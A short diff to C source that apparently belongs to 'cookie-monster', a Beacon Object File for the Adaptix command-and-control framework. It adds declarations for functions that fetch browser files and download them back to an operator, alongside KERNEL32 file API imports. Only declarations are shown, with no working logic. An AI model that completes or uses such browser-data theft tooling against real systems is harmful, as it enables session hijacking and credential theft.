@@ -6,6 +6,10 @@
 #include "cookie-monster-bof.h"
 #include "adaptix.h"
 
+// Function declarations
+BOOL download_file(IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength);
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath);
+
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
 WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
